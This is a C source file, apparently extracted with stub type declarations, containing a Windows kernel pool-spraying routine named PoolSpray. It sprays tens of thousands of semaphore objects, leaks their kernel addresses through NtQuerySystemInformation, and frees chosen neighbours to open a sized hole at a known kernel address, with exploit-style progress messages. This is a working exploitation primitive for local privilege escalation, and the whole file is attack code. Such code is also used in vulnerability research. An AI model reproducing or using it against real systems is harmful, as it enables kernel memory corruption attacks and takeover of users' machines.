
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_6__ TYPE_2__ ;
typedef struct TYPE_5__ TYPE_1__ ;


typedef scalar_t__ (* lpNtQuerySystemInformation ) (int ,int ,int,int *) ;
typedef int hHandlesToClose ;
typedef size_t ULONG ;
typedef unsigned int UINT ;
struct TYPE_6__ {size_t NumberOfHandles; TYPE_1__* Handles; } ;
struct TYPE_5__ {int HandleValue; int Object; int * UniqueProcessId; } ;
typedef int PVOID ;
typedef TYPE_2__* PSYSTEM_HANDLE_INFORMATION_EX ;
typedef scalar_t__ NTSTATUS ;
typedef int * HANDLE ;
typedef int DWORD_PTR ;
typedef int DWORD ;


 int CloseHandle (int *) ;
 int CloseTableHandle (TYPE_2__*,int *) ;
 int * CreateSemaphore (int *,int ,int,int *) ;
 int GetCurrentProcessId () ;
 int GetModuleHandle (char*) ;
 int GetProcAddress (int ,char*) ;
 int GetVersion () ;
 int LOBYTE (int ) ;
 int * LookupObjectHandle (TYPE_2__*,int ) ;
 int MEM_COMMIT ;
 int MEM_RELEASE ;
 int PAGE_READWRITE ;
 scalar_t__ STATUS_SUCCESS ;
 int Sleep (int) ;
 int SystemExtendedHandleInformation ;
 int VirtualAlloc (int *,int,int ,int ) ;
 int VirtualFree (int ,int ,int ) ;
 int memset (int **,int ,int) ;
 int printf (char*,...) ;

void PoolSpray()
{

    lpNtQuerySystemInformation NtQuerySystemInformation = (lpNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
    if (NtQuerySystemInformation == ((void*)0))
    {
        printf("Such a fail...\n");
        return;
    }







    DWORD_PTR dwSemaphoreSize = 0;

    if (LOBYTE(GetVersion()) == 5)
    {
        dwSemaphoreSize = 0x38;
    }
    else if (LOBYTE(GetVersion()) == 6)
    {
        dwSemaphoreSize = 0x48;
    }

    unsigned int cycleCount = 0;
    while (cycleCount < 50000)
    {
        HANDLE hTemp = CreateSemaphore(((void*)0), 0, 3, ((void*)0));
        if (hTemp == ((void*)0))
        {
            break;
        }

        ++cycleCount;
    }

    printf("\t[+] Spawned lots of semaphores\n");

    printf("\t[.] Initing pool windows\n");
    Sleep(2000);

    DWORD dwNeeded = 4096;
    NTSTATUS status = 0xFFFFFFFF;
    PVOID pBuf = VirtualAlloc(((void*)0), 4096, MEM_COMMIT, PAGE_READWRITE);

    while (1)
    {
        status = NtQuerySystemInformation(SystemExtendedHandleInformation, pBuf, dwNeeded, ((void*)0));
        if (status != STATUS_SUCCESS)
        {
            dwNeeded *= 2;
            VirtualFree(pBuf, 0, MEM_RELEASE);
            pBuf = VirtualAlloc(((void*)0), dwNeeded, MEM_COMMIT, PAGE_READWRITE);
        }
        else
        {
            break;
        }
    };

    HANDLE hHandlesToClose[0x30] = {0};
    DWORD dwCurPID = GetCurrentProcessId();
    PSYSTEM_HANDLE_INFORMATION_EX pHandleTable = (PSYSTEM_HANDLE_INFORMATION_EX)pBuf;

    for (ULONG i = 0; i < pHandleTable->NumberOfHandles; i++)
    {
        if (pHandleTable->Handles[i].UniqueProcessId == (HANDLE)dwCurPID)
        {
            DWORD_PTR dwTestObjAddr = (DWORD_PTR)pHandleTable->Handles[i].Object;
            DWORD_PTR dwTestHandleVal = (DWORD_PTR)pHandleTable->Handles[i].HandleValue;
            DWORD_PTR dwWindowAddress = 0;
            bool bPoolWindowFound = 0;

            UINT iObjectsNeeded = 0;


            iObjectsNeeded = (0x218 / dwSemaphoreSize) + ((0x218 % dwSemaphoreSize != 0) ? 1 : 0);

            if (

                    ((dwTestObjAddr & 0xFFF) != 0)
                    &&

                    (((dwTestObjAddr + 0x300) & 0xF000) == (dwTestObjAddr & 0xF000))
                )
            {

                DWORD_PTR dwPrevObject = dwTestObjAddr - dwSemaphoreSize;
                if (LookupObjectHandle(pHandleTable, (PVOID)dwPrevObject) == ((void*)0))
                {
                    continue;
                }

                for (unsigned int j = 1; j < iObjectsNeeded; j++)
                {
                    DWORD_PTR dwNextTestAddr = dwTestObjAddr + (j * dwSemaphoreSize);
                    HANDLE hLookedUp = LookupObjectHandle(pHandleTable, (PVOID)dwNextTestAddr);





                    if (hLookedUp != ((void*)0))
                    {
                        hHandlesToClose[j] = hLookedUp;

                        if (j == iObjectsNeeded - 1)
                        {

                            dwNextTestAddr = dwTestObjAddr + ((j + 1) * dwSemaphoreSize);
                            if (LookupObjectHandle(pHandleTable, (PVOID)dwNextTestAddr) != ((void*)0))
                            {
                                hHandlesToClose[0] = (HANDLE)dwTestHandleVal;
                                bPoolWindowFound = 1;

                                dwWindowAddress = dwTestObjAddr;


                                for (int k = 0; k < iObjectsNeeded; k++)
                                {
                                    if (hHandlesToClose[k] != ((void*)0))
                                    {
                                        CloseHandle(hHandlesToClose[k]);
                                        CloseTableHandle(pHandleTable, hHandlesToClose[k]);
                                    }
                                }
                            }
                            else
                            {
                                memset(hHandlesToClose, 0, sizeof(hHandlesToClose));
                                break;
                            }
                        }
                    }
                    else
                    {
                        memset(hHandlesToClose, 0, sizeof(hHandlesToClose));
                        break;
                    }
                }

                if (bPoolWindowFound)
                {
                    printf("\t[+] Window found at %08X!\n", dwWindowAddress);
                }

            }
        }
    }

    VirtualFree(pBuf, 0, MEM_RELEASE);

    return;
}
